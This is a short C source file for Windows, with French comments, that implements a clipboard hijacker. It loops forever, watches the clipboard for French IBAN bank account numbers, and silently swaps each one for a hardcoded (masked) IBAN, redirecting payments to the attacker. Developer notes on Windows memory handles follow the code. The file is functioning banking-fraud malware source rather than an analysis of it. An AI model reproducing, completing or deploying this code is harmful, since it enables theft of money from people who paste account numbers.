#include <stdio.h>

#include "./memory/memory.h"
#include "./clipboard/clipboard.h"

int main() {
    const char * iban = "FRXXXXXXXXXXXXXXXXXXXXXXXXX";
    const size_t len = strlen(iban) + 1;

    while(1) {
        Sleep(200);
        HGLOBAL hMem = getStringHandle(iban, len);
        // Récupérer la valeur du presse_papier
        OpenClipboard(0);
        const char * pastedIban = getLatestClipboardValue();
        if (strlen(pastedIban) == 27 && pastedIban[0] == 'F' && pastedIban[1] == 'R') {
            modifyClipboard(hMem);
        }
        GlobalUnlock(GetClipboardData(CF_TEXT));
        Sleep(100);
        CloseClipboard();
    }
    return 0;
}

    //Requires GetSystemInfo for page size and allocation granularity
    //LPVOID fdfd = VirtualAlloc(NULL, NULL, MEM_COMMIT, );
    //Could be potentially improved using HeapAlloc/VirtualAlloc
    /*
        HGLOBAL is a data structure specifically made for creating a handle
        a handle allows kernel to isolate memory access and give access to data via ids
    */
    // virtualLock
    // GlobalUnlock ?
    // virtualUnlock



